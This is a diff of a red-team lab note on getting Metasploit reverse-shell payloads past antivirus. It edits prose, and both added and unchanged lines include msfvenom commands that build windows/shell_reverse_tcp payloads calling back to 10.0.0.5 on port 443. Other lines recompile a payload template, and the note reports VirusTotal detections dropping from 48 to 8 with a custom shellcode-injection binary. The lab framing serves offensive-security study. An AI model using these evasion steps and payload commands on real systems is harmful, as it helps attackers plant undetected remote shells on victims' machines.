@@ -1,6 +1,6 @@
-# AV Bypass with Metasploit Templates and Custom Compiled Binaries
+# AV Bypass with Metasploit Templates and Custom Binaries
 
-This is a quick look of a couple of simple ways to **attempt** to bypass antivirus for metasploits reverse shells.
+This is a quick look at a couple of simple ways to **attempt** to bypass antivirus vendors for your shellcodes.
 
 ## 48/68 detections
 
@@ -21,7 +21,7 @@ Checking the file in [VirusTotal](https://www.virustotal.com/#/file/ebf62a614059
 
 ## 36/68 detections
 
-When generating metasploit payloads, our specified shellcode gets injected into the template binaries. Our payload got injected into the template for which the source code is provided below:
+When generating metasploit payloads, our specified shellcode gets injected into the template binaries. The payload we generated earlier got injected into the template for which the source code is provided below:
 
 ![](../.gitbook/assets/msf-template.png)
 
@@ -31,7 +31,7 @@ Out of curiosity, let's simply recompile the standard template:
 root@/usr/share/metasploit-framework/data/templates/src/pe/exe# i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe
 ```
 
-..and regenerate the payload using the new template:
+...and regenerate the payload using the newly compiled template:
 
 ```text
 root@~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypass.exe -f exe > /root/tools/avbypass.exe
@@ -42,7 +42,7 @@ Payload size: 324 bytes
 Final size of exe file: 363382 bytes
 ```
 
-[VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection) detections dropped from 48 to 36 and that did not require any code change!
+[VirusTotal](https://www.virustotal.com/#/file/c311065c151bdd98efc3c413016a7817f6089985e799121007dd993230c530bd/detection) detections for the new executable dropped from 48 to 36 and that did not require any code change!
 
 ![](../.gitbook/assets/msf-template-vt2.png)
 
@@ -52,15 +52,17 @@ If we make a couple of small changes to the code for memory allocation sizes:
 
 ![](../.gitbook/assets/msf-template-sizes.png)
 
-We can further reduce [VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections - this time they drop from 36 to 32:
+...it seems that we can further reduce [VirusTotal](https://www.virustotal.com/#/file/1b2dc633c5709435cd956e214f5417488c04e39ac58ccf5aa8bba4813dc9c005/detection) detections albeit not by much - this time they drop from 36 to 32:
 
 ![](../.gitbook/assets/msf-template-vt3.png)
 
-
-
 ## 8/68 detections - custom x86 binary
 
-Let's do something a bit more custom - build a binary from the previous lab [CreateRemoteThread Shellcode Injection](t1055-process-injection/process-injection.md) that is based on the payload: 
+Let's do something a bit more custom - build a binary from the previous lab [CreateRemoteThread Shellcode Injection](t1055-process-injection/process-injection.md) that is based on the payload:
+
+```text
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
+```
 
 {% code-tabs %}
 {% code-tabs-item title="inject-local-process.cpp" %}
@@ -106,7 +108,7 @@ int main()
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-[VirusTotal](https://www.virustotal.com/#/file/f4dfceb473a878a3751513bacb4d44ee460391ce1a668edb5337d4859e767335/detection) detections dropped dramatically to 8/68:
+This time [VirusTotal](https://www.virustotal.com/#/file/f4dfceb473a878a3751513bacb4d44ee460391ce1a668edb5337d4859e767335/detection) detections dropped dramatically to 8/68:
 
 ![](../.gitbook/assets/msf-vt5.png)
 
